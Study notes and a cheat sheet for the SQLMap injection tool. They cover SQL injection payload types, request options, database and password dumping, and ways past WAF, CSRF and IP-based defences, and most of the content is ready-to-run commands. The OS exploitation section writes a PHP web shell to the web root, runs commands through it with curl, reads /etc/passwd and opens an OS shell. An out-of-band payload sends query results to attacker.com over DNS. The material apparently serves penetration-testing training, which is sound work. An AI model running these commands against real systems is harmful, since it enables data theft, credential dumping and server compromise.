# SQLMap Essentials

Supported SQLi Types:
- Boolean-based blind SQL Injection
	- `AND 1=1`
	- most common SQLi type
- Error-based SQL Injection
	- `AND GTID_SUBSET(@@version,0)`
	- Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request
- UNION query-based
	- `UNION ALL SELECT 1,@@version,3`
	- Fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request
- Stacked queries
	- `; DROP TABLE users`
	- injecting additional SQL statements after the vulnerable one
- Time-based blind SQL Injection
	- `AND 1=IF(2>1,SLEEP(5),0)`
	- slower than the boolean-based blind SQLi
- Inline queries
	- `SELECT (SELECT @@version) from`
	- Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way
- Out-of-band SQL Injection
	- `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
	- This is considered one of the most advanced types of SQLi 
	- running the SQLMap on the DNS server for the domain under control (e.g. .attacker.com), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. foo.attacker.com), where foo would be the SQL response we want to receive

## SQLMap

Add custom injection mark --> `1*`

GET/POST
```sh
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

To run SQLMap with an HTTP request file, we use the `-r` flag, as follows
```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

```sh
sqlmap -r req.txt
```

```sh
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u www.target.com --data='id=1' --method PUT
```

and others

The `-t` option stores the whole traffic content to an output file
`-v` option, which raises the verbosity level of the console output
utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`)

## Attack tuning

Every payload sent to the target consists of:
- vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
- boundaries (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

### Prefix/suffix
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`

### Level/risk

There is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

In verbosity 3 or higher (e.g. `-v 3`), messages containing the used `[PAYLOAD]` will be displayed

## Database Enumeration

- --banner: get version of db
- --current-user
- --hostname
- --current-db
- --passwords
- --is-dba
- -D database
- --dump -T table --> dump all table
- --dump -T table -C column1, column2
- --dump -T table --where="name LIKE 'f%'"
- --dump-all  --exclude-sysdbs
- --schema: retrieve structure of all tables
- --search -T user
- --search -C pass
- --dump -D master -T users
- --passwords --batch: dump content of system tables containing db specific credentials

## Bypassing Web App Protections

CSRF Token
```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

Unique Value Bypass
```
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

Calculated Parameter Bypass
```shell-session
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

IP concealing
```
--proxy="socks4://177.39.187.70:33283
```
In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`.
`--tor`
`--check-tor`

WAF Bypass
SQLMap uses a third-party library [identYwaf](https://github.com/stamparm/identYwaf), containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch `--skip-waf`.

User-agent Blacklisting Bypass
```
--random-agent
```

Tamper Scripts
`--tamper=between,randomcase`
Get all tamper scripts: `--list-tampers`

Misc.
--chunked splits POST request's body into so-called chunks so blacklisted SQL keyword can pass unnoticed, or using HTTP parameter pollution

## OS Exploitation

Check DBA privilege
```shell-session
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

Read file
```shell-session
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

Write file (Webshell)
```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php

sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

curl http://www.example.com/shell.php?cmd=ls+-la
```

OS command execution
```shell-session
sqlmap -u "http://www.example.com/?id=1" --os-shell

sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```


| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |

## Cheatsheet

| **Command**                                                                                                               | **Description**                                             |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |


